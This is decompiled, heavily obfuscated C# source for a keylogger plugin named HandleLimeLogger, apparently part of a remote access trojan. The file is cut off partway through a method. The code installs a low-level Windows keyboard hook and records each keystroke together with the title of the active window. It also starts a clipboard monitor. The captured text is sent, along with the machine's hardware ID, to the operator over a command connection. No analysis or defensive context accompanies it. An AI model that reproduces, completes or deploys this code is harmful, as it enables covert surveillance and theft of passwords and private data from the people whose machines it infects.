using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using HsZcU78F13T1yLWI1V;
using MessagePackLib.MessagePack;
using UY3BiEArlp6B4GPt9k;

namespace Plugin;

public static class HandleLimeLogger
{
	private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

	[Serializable]
	[CompilerGenerated]
	private sealed class _003C_003Ec
	{
		public static readonly _003C_003Ec _003C_003E9;

		public static ThreadStart _003C_003E9__1_0;

		private static _003C_003Ec dVISaVItjXf4OegBgS1;

		[MethodImpl(MethodImplOptions.NoInlining)]
		static _003C_003Ec()
		{
			int num = 2;
			while (true)
			{
				int num2 = num;
				do
				{
					IL_0012:
					switch (num2)
					{
					default:
						return;
					case 0:
						return;
					case 1:
						break;
					case 2:
						EFHnwvI1awhxQWLZDmb();
						num2 = 0;
						if (0 == 0)
						{
							num2 = 1;
						}
						goto IL_0012;
					}
					_003C_003E9 = new _003C_003Ec();
					num2 = 0;
				}
				while (0 == 0);
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public _003C_003Ec()
		{
			EFHnwvI1awhxQWLZDmb();
			base._002Ector();
			int num = 0;
			if (false)
			{
				int num2;
				num = num2;
			}
			switch (num)
			{
			case 0:
				break;
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal void _003CRun_003Eb__1_0()
		{
			int num = 5;
			while (true)
			{
				int num2 = num;
				while (true)
				{
					switch (num2)
					{
					case 6:
						return;
					case 3:
						I6FSxUIip4ZbXPoMRUH(DUP3IcFRqnbqX70Kci.rvB14gJtv);
						num2 = 2;
						continue;
					case 2:
						I6FSxUIip4ZbXPoMRUH(DUP3IcFRqnbqX70Kci.AgmIFuoeRm);
						num2 = 6;
						continue;
					case 5:
					case 8:
						if (Connection.IsConnected)
						{
							num2 = 1;
							if (RpuuaeIMPiZiKmodN3Q())
							{
								continue;
							}
							break;
						}
						goto case 9;
					case 1:
					case 4:
						PVfeYpIO4sjZJYQYbm4(1000, mQl56c3xtgNvqZdHV0B.h4E3HuCGLF);
						num2 = 0;
						if (MS23YFI2FFAg1wYLjMX() == null)
						{
							continue;
						}
						break;
					default:
						if (isON)
						{
							num2 = 8;
							continue;
						}
						goto case 9;
					case 9:
						UnhookWindowsHookEx(_hookID);
						num2 = 7;
						if (MS23YFI2FFAg1wYLjMX() == null)
						{
							continue;
						}
						break;
					case 7:
						FXGMWrISiZiPIFKo7hZ();
						num2 = 3;
						continue;
					}
					break;
				}
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static void EFHnwvI1awhxQWLZDmb()
		{
			WkMgYHbfSUMGdoITRx.gIGiY8hzeM6TJ();
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static bool RpuuaeIMPiZiKmodN3Q()
		{
			return dVISaVItjXf4OegBgS1 == null;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static _003C_003Ec MS23YFI2FFAg1wYLjMX()
		{
			return dVISaVItjXf4OegBgS1;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static void PVfeYpIO4sjZJYQYbm4(int P_0, object P_1)
		{
			mQl56c3xtgNvqZdHV0B.edv36NoIr(P_0, (mQl56c3xtgNvqZdHV0B)P_1);
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static void FXGMWrISiZiPIFKo7hZ()
		{
			Connection.Disconnected();
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static void I6FSxUIip4ZbXPoMRUH(object P_0)
		{
			DUP3IcFRqnbqX70Kci.edv36NoIr((DUP3IcFRqnbqX70Kci)P_0);
		}
	}

	public static bool isON;

	private static readonly LowLevelKeyboardProc _proc;

	private static IntPtr _hookID;

	private static readonly int WHKEYBOARDLL;

	private static string CurrentActiveWindowTitle;

	internal static HandleLimeLogger G3E77kyhmT7DWA8Cpxp;

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void Run()
	{
		int num = 2;
		while (true)
		{
			int num2 = num;
			do
			{
				IL_0012:
				ThreadStart threadStart;
				switch (num2)
				{
				default:
					return;
				case 4:
					wGnsafy8A1sb7TDyBr4(new ClipboardNotification(), By8NLD32bdZYtXI0lXn.sbr3Y3MIub);
					num2 = 0;
					if (EOlwYlyFP5WpVK82ch3())
					{
						num2 = 0;
					}
					goto IL_0012;
				case 2:
					_hookID = n5OpPSyvpPJkOoaGNUs(_proc);
					num2 = 1;
					if (uqayZbyXXwSQ0nj8Dj6() != null)
					{
						num2 = 1;
					}
					goto IL_0012;
				case 1:
					threadStart = _003C_003Ec._003C_003E9__1_0;
					if (threadStart != null)
					{
						break;
					}
					goto IL_008d;
				case 0:
					return;
				case 3:
					threadStart = (_003C_003Ec._003C_003E9__1_0 = [MethodImpl(MethodImplOptions.NoInlining)] () =>
					{
						int num3 = 5;
						while (true)
						{
							int num4 = num3;
							while (true)
							{
								switch (num4)
								{
								case 6:
									return;
								case 3:
									_003C_003Ec.I6FSxUIip4ZbXPoMRUH(DUP3IcFRqnbqX70Kci.rvB14gJtv);
									num4 = 2;
									continue;
								case 2:
									_003C_003Ec.I6FSxUIip4ZbXPoMRUH(DUP3IcFRqnbqX70Kci.AgmIFuoeRm);
									num4 = 6;
									continue;
								case 5:
								case 8:
									if (Connection.IsConnected)
									{
										num4 = 1;
										if (_003C_003Ec.RpuuaeIMPiZiKmodN3Q())
										{
											continue;
										}
										break;
									}
									goto case 9;
								case 1:
								case 4:
									_003C_003Ec.PVfeYpIO4sjZJYQYbm4(1000, mQl56c3xtgNvqZdHV0B.h4E3HuCGLF);
									num4 = 0;
									if (_003C_003Ec.MS23YFI2FFAg1wYLjMX() == null)
									{
										continue;
									}
									break;
								default:
									if (isON)
									{
										num4 = 8;
										continue;
									}
									goto case 9;
								case 9:
									UnhookWindowsHookEx(_hookID);
									num4 = 7;
									if (_003C_003Ec.MS23YFI2FFAg1wYLjMX() == null)
									{
										continue;
									}
									break;
								case 7:
									_003C_003Ec.FXGMWrISiZiPIFKo7hZ();
									num4 = 3;
									continue;
								}
								break;
							}
						}
					});
					break;
				}
				inQ9c1yTuqgAbv8lBkK(new Thread(threadStart), Oq3P7GLZ27iDa8IJ0C.cpgN0pXl3);
				num2 = 4;
				if (uqayZbyXXwSQ0nj8Dj6() != null)
				{
					num2 = 3;
				}
				goto IL_0012;
				IL_008d:
				num2 = 3;
			}
			while (EOlwYlyFP5WpVK82ch3());
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private static IntPtr SetHook(object proc)
	{
		IntPtr result = default(IntPtr);
		switch (1)
		{
		case 1:
			try
			{
				Process process = (Process)xHrcS2yfnrclubQb9t8(JcY6jN390DZjpVwj7oV.l633tigNdn);
				int num = 0;
				if (uqayZbyXXwSQ0nj8Dj6() != null)
				{
					int num2 = default(int);
					num = num2;
				}
				switch (num)
				{
				default:
					try
					{
						ProcessModule processModule = (ProcessModule)wsFPnly6uYiuiBHJXek(process, EBRKjb3Vtc0LKVge8ac.UA538ibp0Z);
						int num3 = 0;
						if (EOlwYlyFP5WpVK82ch3())
						{
							num3 = 0;
						}
						switch (num3)
						{
						default:
							try
							{
								result = SetWindowsHookEx(WHKEYBOARDLL, (LowLevelKeyboardProc)proc, GetModuleHandle((string)IO6m8MygXrwTaGrPrSI(processModule, G9MPu3YpjUsKCGpKjA.SKR3lWCOXM)), 0u);
								int num4 = 0;
								if (!EOlwYlyFP5WpVK82ch3())
								{
									int num5 = default(int);
									num4 = num5;
								}
								switch (num4)
								{
								case 0:
									break;
								}
							}
							finally
							{
								int num6;
								if (processModule == null)
								{
									num6 = 1;
									if (uqayZbyXXwSQ0nj8Dj6() != null)
									{
										int num7 = default(int);
										num6 = num7;
									}
									goto IL_0102;
								}
								goto IL_0127;
								IL_0102:
								switch (num6)
								{
								default:
									goto end_IL_00e2;
								case 1:
									goto end_IL_00e2;
								case 2:
									break;
								case 0:
									goto end_IL_00e2;
								}
								goto IL_0127;
								IL_0127:
								inQ9c1yTuqgAbv8lBkK(processModule, Oq3P7GLZ27iDa8IJ0C.fgGrNm7fE);
								num6 = 0;
								if (uqayZbyXXwSQ0nj8Dj6() == null)
								{
									num6 = 0;
								}
								goto IL_0102;
								end_IL_00e2:;
							}
							break;
						}
					}
					finally
					{
						if (process != null)
						{
							int num8 = 1;
							if (uqayZbyXXwSQ0nj8Dj6() == null)
							{
								num8 = 1;
							}
							int num9 = default(int);
							while (true)
							{
								switch (num8)
								{
								case 1:
									inQ9c1yTuqgAbv8lBkK(process, Oq3P7GLZ27iDa8IJ0C.fgGrNm7fE);
									num8 = 0;
									if (!EOlwYlyFP5WpVK82ch3())
									{
										num8 = num9;
									}
									continue;
								case 0:
									break;
								}
								break;
							}
						}
					}
					break;
				}
			}
			catch (Exception ex)
			{
				Packet.Error((string)IO6m8MygXrwTaGrPrSI(ex, G9MPu3YpjUsKCGpKjA.DAl3qt3V6c));
				int num10 = 2;
				if (!EOlwYlyFP5WpVK82ch3())
				{
					int num11 = default(int);
					num10 = num11;
				}
				while (true)
				{
					switch (num10)
					{
					default:
						result = IntPtr.Zero;
						num10 = 1;
						if (uqayZbyXXwSQ0nj8Dj6() != null)
						{
							num10 = 0;
						}
						continue;
					case 2:
						isON = false;
						num10 = 0;
						if (EOlwYlyFP5WpVK82ch3())
						{
							num10 = 0;
						}
						continue;
					case 1:
						break;
					}
					break;
				}
			}
			break;
		}
		return result;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
	{
		IntPtr result = default(IntPtr);
		switch (1)
		{
		case 1:
			try
			{
				int num;
				if (nCode >= 0)
				{
					num = 6;
					if (!EOlwYlyFP5WpVK82ch3())
					{
						goto IL_0044;
					}
					goto IL_0048;
				}
				goto IL_014d;
				IL_014d:
				result = CallNextHookEx(_hookID, nCode, wParam, lParam);
				int num2 = 33;
				goto IL_0044;
				IL_0044:
				num = num2;
				goto IL_0048;
				IL_0048:
				Keys keys = default(Keys);
				int num4 = default(int);
				string text = default(string);
				string text2 = default(string);
				StringBuilder stringBuilder = default(StringBuilder);
				while (true)
				{
					switch (num)
					{
					case 22:
					{
						object obj = Q7Mp5iyo9jUgPgfII7M(140);
						keys = (Keys)num4;
						text = (string)rLdOUkyPVVpvxULKMmt(obj, keys.ToString(), Q7Mp5iyo9jUgPgfII7M(146), ArgSUFncog3IDpIWFj.kujz9EokA);
						num = 32;
						continue;
					}
					case 12:
						break;
					case 8:
					case 15:
					case 16:
					case 23:
					case 32:
					case 34:
					case 39:
					case 41:
						if (!UPutC6yGULVthhTliUP(text, qdqHI93aUQDwMc4m8CY.KRl3Lqi0yl))
						{
							num = 5;
							continue;
						}
						break;
					default:
						goto IL_0185;
					case 35:
						if (num4 > 135)
						{
							num = 47;
							continue;
						}
						goto case 22;
					case 26:
						goto IL_0242;
					case 11:
						text = (string)Q7Mp5iyo9jUgPgfII7M(220);
						num = 8;
						continue;
					case 3:
						goto IL_0294;
					case 10:
						if (text2 == null)
						{
							goto IL_02bf;
						}
						goto case 29;
					case 1:
					case 21:
						text = nCP5vtxT3QjsSeuiK3.xuCtsHmOK(246);
						num = 23;
						continue;
					case 2:
						text = (string)IO6m8MygXrwTaGrPrSI(text, G9MPu3YpjUsKCGpKjA.fgr36twkdZ);
						num = 36;
						continue;
					case 5:
						stringBuilder = new StringBuilder();
						num = 46;
						continue;
					case 46:
						if (!EkICbnK23EvZuxtoAo.edv36NoIr(CurrentActiveWindowTitle, (string)TYjOLIywLO1EsvfenM6(), EkICbnK23EvZuxtoAo.MjGU1WV79))
						{
							num = 9;
							continue;
						}
						goto IL_0294;
					case 29:
						if (IGBVCKyepYwmnOUIK2W(text2, Q7Mp5iyo9jUgPgfII7M(152), EkICbnK23EvZuxtoAo.MjGU1WV79))
						{
							goto case 11;
						}
						goto IL_0373;
					case 19:
						text = G9MPu3YpjUsKCGpKjA.edv36NoIr(text, G9MPu3YpjUsKCGpKjA.L2P3PU1cIQ);
						num = 13;
						continue;
					case 13:
					case 36:
						if (num4 < 112)
						{
							num = 20;
							continue;
						}
						goto case 35;
					case 38:
					case 43:
						text = (string)Q7Mp5iyo9jUgPgfII7M(278);
						num = 15;
						continue;
					case 44:
						if (!EkICbnK23EvZuxtoAo.edv36NoIr(text2, (string)Q7Mp5iyo9jUgPgfII7M(166), EkICbnK23EvZuxtoAo.MjGU1WV79))
						{
							num = 45;
							if (!EOlwYlyFP5WpVK82ch3())
							{
								num = 28;
							}
							continue;
						}
						goto case 37;
					case 18:
						goto IL_03fe;
					case 24:
						num4 = rcxMkK30R6qck84YZIk.edv36NoIr(lParam, rcxMkK30R6qck84YZIk.swh3uCOAH6);
						num = 30;
						if (EOlwYlyFP5WpVK82ch3())
						{
							num = 31;
						}
						continue;
					case 30:
						Mh0FNQ3NelHWu9MoUCj.edv36NoIr(stringBuilder, text, Mh0FNQ3NelHWu9MoUCj.UfM3MgjaFG);
						num = 40;
						continue;
					case 27:
					case 28:
						goto IL_04ca;
					case 45:
						if (IGBVCKyepYwmnOUIK2W(text2, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(182), EkICbnK23EvZuxtoAo.MjGU1WV79))
						{
							goto IL_0534;
						}
						goto case 42;
					case 7:
					case 40:
					{
						MsgPack msgPack = new MsgPack();
						IO121fyYdRDcj07Y7fa(msgPack.ForcePathObject((string)Q7Mp5iyo9jUgPgfII7M(0)), nCP5vtxT3QjsSeuiK3.xuCtsHmOK(32));
						IO121fyYdRDcj07Y7fa(Of7jgbyWVj2HIn46RBJ(msgPack, Q7Mp5iyo9jUgPgfII7M(68)), IokkfXypkbBq5nHPQ2B());
						IO121fyYdRDcj07Y7fa(msgPack.ForcePathObject((string)Q7Mp5iyo9jUgPgfII7M(80)), IO6m8MygXrwTaGrPrSI(stringBuilder, G9MPu3YpjUsKCGpKjA.Rj79dRG3t));
						Connection.Send((byte[])FEXGqcy0v0tqadpISQ4(msgPack));
						num = 12;
						continue;
					}
					case 9:
					case 17:
						yqv65tyCOPL1WtZ9thi(stringBuilder, IL0jkJy30I7JuLb29J0(ouNcZg3GI4daI4BYTbE.IkI3RbwdcD), Mh0FNQ3NelHWu9MoUCj.UfM3MgjaFG);
						num = 25;
						continue;
					case 4:
						if (EkICbnK23EvZuxtoAo.edv36NoIr(text2, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(210), EkICbnK23EvZuxtoAo.MjGU1WV79))
						{
							num = 38;
							continue;
						}
						goto case 8;
					case 6:
						if (mtIyk5yRgkoDf7hu2yb(wParam, HHcEWZ3s4CqGp25whda.edv36NoIr(256, HHcEWZ3s4CqGp25whda.rHX3ABP4El), UmWOTC3Jtb2WnReoHlB.eWc3ejWXBj))
						{
							num = 24;
							continue;
						}
						break;
					case 25:
						goto IL_064d;
					case 42:
						if (EkICbnK23EvZuxtoAo.edv36NoIr(text2, (string)Q7Mp5iyo9jUgPgfII7M(198), EkICbnK23EvZuxtoAo.MjGU1WV79))
						{
							num = 27;
							continue;
						}
						goto case 4;
					case 14:
					case 20:
					case 47:
						keys = (Keys)num4;
						num = 26;
						continue;
					case 37:
						text = (string)Q7Mp5iyo9jUgPgfII7M(226);
						num = 16;
						continue;
					case 31:
					{
						bool num3 = (GetKeyState(20) & 0xFFFF) != 0;
						bool flag = (GetKeyState(160) & 0x8000) != 0 || (GetKeyState(161) & 0x8000) != 0;
						text = (string)EsMo6ryNcOsWO7gbqCI((uint)num4);
						if (num3 || flag)
						{
							num = 2;
							continue;
						}
						goto case 19;
					}
					case 33:
						goto end_IL_0028;
					}
					break;
					IL_064d:
					yqv65tyCOPL1WtZ9thi(stringBuilder, ouNcZg3GI4daI4BYTbE.edv36NoIr(ouNcZg3GI4daI4BYTbE.IkI3RbwdcD), Mh0FNQ3NelHWu9MoUCj.UfM3MgjaFG);
					num = 0;
					if (uqayZbyXXwSQ0nj8Dj6() == null)
					{
						continue;
					}
					goto IL_0044;
					IL_0534:
					num2 = 21;
					goto IL_0044;
					IL_04ca:
					text = (string)Q7Mp5iyo9jUgPgfII7M(262);
					num = 39;
					if (EOlwYlyFP5WpVK82ch3())
					{
						continue;
					}
					goto IL_0044;
					IL_03fe:
					yqv65tyCOPL1WtZ9thi(stringBuilder, IL0jkJy30I7JuLb29J0(ouNcZg3GI4daI4BYTbE.IkI3RbwdcD), Mh0FNQ3NelHWu9MoUCj.UfM3MgjaFG);
					num = 30;
					if (EOlwYlyFP5WpVK82ch3())
					{
						continue;
					}
					goto IL_0044;
					IL_02bf:
					num2 = 41;
					goto IL_0044;
					IL_0373:
					num = 44;
					if (uqayZbyXXwSQ0nj8Dj6() == null)
					{
						continue;
					}
					goto IL_0044;
					IL_0294:
					Mh0FNQ3NelHWu9MoUCj.edv36NoIr(stringBuilder, text, Mh0FNQ3NelHWu9MoUCj.UfM3MgjaFG);
					num = 7;
					if (uqayZbyXXwSQ0nj8Dj6() == null)
					{
						continue;
					}
					goto IL_0044;
					IL_0242:
					text2 = keys.ToString();
					num2 = 10;
					goto IL_0044;
					IL_0185:
					StringBuilder stringBuilder2 = stringBuilder;
					string[] obj2 = new string[5]
					{
						nCP5vtxT3QjsSeuiK3.xuCtsHmOK(294),
						(string)TYjOLIywLO1EsvfenM6(),
						(string)Q7Mp5iyo9jUgPgfII7M(308),
						null,
						null
					};
					DateTime dateTime = V3xkU5yZa97ZfUrnG4P(rn2h9u3XHZn2iN6K6M9.DUm3EYTL3j);
					obj2[3] = NlM7ps3BUWfdP1JDbfS.edv36NoIr(ref dateTime, NlM7ps3BUWfdP1JDbfS.QPd3v7bXUr);
					obj2[4] = (string)Q7Mp5iyo9jUgPgfII7M(318);
					Mh0FNQ3NelHWu9MoUCj.edv36NoIr(stringBuilder2, (string)xnI9dqylfmiVLjGtXqL(obj2, W2iYiB3yBUHIlM5V5G5.LPr3cQHb2Y), Mh0FNQ3NelHWu9MoUCj.UfM3MgjaFG);
					num2 = 18;
					goto IL_0044;
				}
				goto IL_014d;
				end_IL_0028:;
			}
			catch
			{
				int num5 = 0;
				if (uqayZbyXXwSQ0nj8Dj6() == null)
				{
					num5 = 1;
				}
				while (true)
				{
					switch (num5)
					{
					case 1:
						result = IntPtr.Zero;
						num5 = 0;
						if (uqayZbyXXwSQ0nj8Dj6() != null)
						{
							num5 = 0;
						}
						continue;
					case 0:
						break;
					}
					break;
				}
			}
			break;
		}
		return result;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private static string KeyboardLayout(uint vkCode)
	{
		int num = 1;
		Keys keys = default(Keys);
		string result = default(string);
		uint wScanCode = default(uint);
		byte[] lpKeyState = default(byte[]);
		IntPtr keyboardLayout = default(IntPtr);
		int num4 = default(int);
		while (true)
		{
			int num2 = num;
			do
			{
				switch (num2)
				{
				case 2:
					return keys.ToString();
				case 1:
					try
					{
						StringBuilder stringBuilder = new StringBuilder();
						int num3 = 3;
						while (true)
						{
							switch (num3)
							{
							default:
								result = "";
								num3 = 2;
								if (uqayZbyXXwSQ0nj8Dj6() == null)
								{
									num3 = 8;
								}
								continue;
							case 7:
								ToUnicodeEx(vkCode, wScanCode, lpKeyState, stringBuilder, 5, 0u, keyboardLayout);
								num3 = 1;
								if (EOlwYlyFP5WpVK82ch3())
								{
									continue;
								}
								goto IL_0063;
							case 8:
								break;
							case 4:
								wScanCode = MapVirtualKey(vkCode, 0u);
								num3 = 5;
								continue;
							case 6:
								if (!GetKeyboardState(lpKeyState))
								{
									num3 = 0;
									if (EOlwYlyFP5WpVK82ch3())
									{
										continue;
									}
									goto IL_0063;
								}
								goto case 4;
							case 5:
							{
								keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out var _));
								num3 = 7;
								continue;
							}
							case 1:
								result = G9MPu3YpjUsKCGpKjA.edv36NoIr(stringBuilder, G9MPu3YpjUsKCGpKjA.Rj79dRG3t);
								num3 = 2;
								continue;
							case 3:
								lpKeyState = new byte[256];
								num4 = 6;
								goto IL_0063;
							case 2:
								break;
								IL_0063:
								num3 = num4;
								continue;
							}
							break;
						}
					}
					catch
					{
						int num5 = 0;
						if (EOlwYlyFP5WpVK82ch3())
						{
							num5 = 0;
						}
						switch (num5)
						{
						}
						break;
					}
					return result;
				}
				keys = (Keys)vkCode;
				num2 = 2;
			}
			while (uqayZbyXXwSQ0nj8Dj6() == null);
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private static string GetActiveWindowTitle()
	{
		string result = default(string);
		switch (1)
		{
		case 1:
			try
			{
				GetWindowThreadProcessId(GetForegroundWindow(), out var lpdwProcessId);
				int num = 1;
				if (uqayZbyXXwSQ0nj8Dj6() != null)
				{
					num = 0;
				}
				string text = default(string);
				Process process = default(Process);
				int num2 = default(int);
				while (true)
				{
					switch (num)
					{
					case 6:
						if (UPutC6yGULVthhTliUP(text, qdqHI93aUQDwMc4m8CY.GgW3SafGJU))
						{
							num = 0;
							if (EOlwYlyFP5WpVK82ch3())
							{
								num = 0;
							}
							continue;
						}
						goto case 2;
					case 1:
						process = (Process)IriATdyEffqswA7wAMs((int)lpdwProcessId, bpE5xp3kALvGO65SSOB.Wuu3h8mFCX);
						num = 4;
						continue;
					case 5:
						result = text;
						num = 3;
						continue;
					case 4:
						text = (string)IO6m8MygXrwTaGrPrSI(process, G9MPu3YpjUsKCGpKjA.ixU34exTCc);
						num = 2;
						if (uqayZbyXXwSQ0nj8Dj6() == null)
						{
							num = 6;
						}
						continue;
					case 2:
						CurrentActiveWindowTitle = text;
						num = 5;
						if (!EOlwYlyFP5WpVK82ch3())
						{
							num = num2;
						}
						continue;
					default:
						text = (string)IO6m8MygXrwTaGrPrSI(process, G9MPu3YpjUsKCGpKjA.sWE3WIGStS);
						num = 2;
						continue;
					case 3:
						break;
					}
					break;
				}
			}
			catch (Exception)
			{
				int num3 = 0;
				if (EOlwYlyFP5WpVK82ch3())
				{
					num3 = 0;
				}
				while (true)
				{
					switch (num3)
					{
					default:
						result = (string)Q7Mp5iyo9jUgPgfII7M(330);
						num3 = 1;
						if (!EOlwYlyFP5WpVK82ch3())
						{
							num3 = 0;
						}
						continue;
					case 1:
						break;
					}
					break;
				}
			}
			break;
		}
		return result;
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool UnhookWindowsHookEx(IntPtr hhk);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string lpModuleName);

	[DllImport("user32.dll")]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
	public static extern short GetKeyState(int keyCode);

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool GetKeyboardState(byte[] lpKeyState);

	[DllImport("user32.dll")]
	private static extern IntPtr GetKeyboardLayout(uint idThread);

	[DllImport("user32.dll")]
	private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

	[DllImport("user32.dll")]
	private static extern uint MapVirtualKey(uint uCode, uint uMapType);

	[MethodImpl(MethodImplOptions.NoInlining)]
	static HandleLimeLogger()
	{
		int num = 4;
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 5:
					_hookID = IntPtr.Zero;
					num2 = 0;
					if (0 == 0)
					{
						continue;
					}
					break;
				case 4:
					fXvEJtyBxAjGkZraNBv();
					num2 = 3;
					if (true)
					{
						continue;
					}
					break;
				case 1:
					_proc = HookCallback;
					num2 = 5;
					continue;
				default:
					WHKEYBOARDLL = 13;
					num2 = 2;
					continue;
				case 3:
					isON = false;
					num2 = 1;
					if (0 == 0)
					{
						continue;
					}
					break;
				case 2:
					return;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static IntPtr n5OpPSyvpPJkOoaGNUs(object P_0)
	{
		return SetHook(P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void inQ9c1yTuqgAbv8lBkK(object P_0, object P_1)
	{
		Oq3P7GLZ27iDa8IJ0C.edv36NoIr(P_0, (Oq3P7GLZ27iDa8IJ0C)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void wGnsafy8A1sb7TDyBr4(object P_0, object P_1)
	{
		By8NLD32bdZYtXI0lXn.edv36NoIr((Form)P_0, (By8NLD32bdZYtXI0lXn)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool EOlwYlyFP5WpVK82ch3()
	{
		return G3E77kyhmT7DWA8Cpxp == null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static HandleLimeLogger uqayZbyXXwSQ0nj8Dj6()
	{
		return G3E77kyhmT7DWA8Cpxp;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object xHrcS2yfnrclubQb9t8(object P_0)
	{
		return JcY6jN390DZjpVwj7oV.edv36NoIr((JcY6jN390DZjpVwj7oV)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object wsFPnly6uYiuiBHJXek(object P_0, object P_1)
	{
		return EBRKjb3Vtc0LKVge8ac.edv36NoIr(P_0, (EBRKjb3Vtc0LKVge8ac)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object IO6m8MygXrwTaGrPrSI(object P_0, object P_1)
	{
		return G9MPu3YpjUsKCGpKjA.edv36NoIr(P_0, (G9MPu3YpjUsKCGpKjA)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool mtIyk5yRgkoDf7hu2yb(IntPtr P_0, IntPtr P_1, object P_2)
	{
		return UmWOTC3Jtb2WnReoHlB.edv36NoIr(P_0, P_1, (UmWOTC3Jtb2WnReoHlB)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object EsMo6ryNcOsWO7gbqCI(uint vkCode)
	{
		return KeyboardLayout(vkCode);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object Q7Mp5iyo9jUgPgfII7M(int P_0)
	{
		return nCP5vtxT3QjsSeuiK3.xuCtsHmOK(P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object rLdOUkyPVVpvxULKMmt(object P_0, object P_1, object P_2, object P_3)
	{
		return ArgSUFncog3IDpIWFj.edv36NoIr((string)P_0, (string)P_1, (string)P_2, (ArgSUFncog3IDpIWFj)P_3);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool IGBVCKyepYwmnOUIK2W(object P_0, object P_1, object P_2)
	{
		return EkICbnK23EvZuxtoAo.edv36NoIr((string)P_0, (string)P_1, (EkICbnK23EvZuxtoAo)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool UPutC6yGULVthhTliUP(object P_0, object P_1)
	{
		return qdqHI93aUQDwMc4m8CY.edv36NoIr((string)P_0, (qdqHI93aUQDwMc4m8CY)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object TYjOLIywLO1EsvfenM6()
	{
		return GetActiveWindowTitle();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object IL0jkJy30I7JuLb29J0(object P_0)
	{
		return ouNcZg3GI4daI4BYTbE.edv36NoIr((ouNcZg3GI4daI4BYTbE)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object yqv65tyCOPL1WtZ9thi(object P_0, object P_1, object P_2)
	{
		return Mh0FNQ3NelHWu9MoUCj.edv36NoIr(P_0, (string)P_1, (Mh0FNQ3NelHWu9MoUCj)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static DateTime V3xkU5yZa97ZfUrnG4P(object P_0)
	{
		return rn2h9u3XHZn2iN6K6M9.edv36NoIr((rn2h9u3XHZn2iN6K6M9)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object xnI9dqylfmiVLjGtXqL(object P_0, object P_1)
	{
		return W2iYiB3yBUHIlM5V5G5.edv36NoIr((string[])P_0, (W2iYiB3yBUHIlM5V5G5)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void IO121fyYdRDcj07Y7fa(object P_0, object P_1)
	{
		((MsgPack)P_0).AsString = (string)P_1;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object Of7jgbyWVj2HIn46RBJ(object P_0, object P_1)
	{
		return ((MsgPack)P_0).ForcePathObject((string)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object IokkfXypkbBq5nHPQ2B()
	{
		return Connection.Hwid;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object FEXGqcy0v0tqadpISQ4(object P_0)
	{
		return ((MsgPack)P_0).Encode2Bytes();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object IriATdyEffqswA7wAMs(int P_0, object P_1)
	{
